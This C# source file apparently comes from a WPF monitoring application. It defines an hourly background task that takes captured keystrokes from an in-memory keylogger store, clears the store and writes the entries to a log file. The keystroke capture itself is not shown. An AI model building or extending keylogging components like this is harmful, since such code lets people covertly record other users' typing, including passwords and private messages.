using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using WPF.Databases.Contexts;
using WPF.Models;
using WPF.Models.Extensions;
using WPF.Models.Interfaces;

namespace WPF.Managers.Tasks
{
    class KeyLoggerCollecterTask : IBackgroundTask, IDisposable
    {
        public BackgroundWorker BackgroundWorker { get; } = new BackgroundWorker();

        public bool MustBeCollected => true;

        public bool Completed { get; set; }

        public void Dispose()
        {
            BackgroundWorker.DoWork -= BackgroundWorker_DoWork;
            BackgroundWorker.DoWork -= BackgroundWorker_Collect;
            GC.Collect();
        }

        public void Run()
        {
            BackgroundWorker.DoWork += BackgroundWorker_DoWork;
            BackgroundWorker.RunWorkerAsync();
        }

        private void BackgroundWorker_DoWork(object sender, DoWorkEventArgs e)
        {
            while(true)
            {
                BackgroundWorker_Collect(sender, e);
                Thread.Sleep(3600000); // Sleep one hour
            }
        }

        public void Collect()
        {
            BackgroundWorker.DoWork -= BackgroundWorker_DoWork;

            BackgroundWorker worker = new BackgroundWorker();
            worker.DoWork += BackgroundWorker_Collect;
            worker.RunWorkerAsync();
        }

        private void BackgroundWorker_Collect(object sender, DoWorkEventArgs e)
        {
            Completed = false;
            if (MainContext.Instance.KeyLogger.Any())
            {
                var stringbuilder = new StringBuilder();
                foreach (var log in MainContext.Instance.KeyLogger)
                {
                    stringbuilder.Append(log);
                    stringbuilder.Append(Environment.NewLine);
                }
                MainContext.Instance.KeyLogger.Clear();

                LogManager.Instance.LogToFile(new Models.LogInfoModel
                {
                    Type = Models.Enums.FileTypesEnum.KEYLOGGER,
                    Message = new SimpleMessageInfoModel(stringbuilder.ToString())
                });
            }
            Completed = true;
        }
    }
}
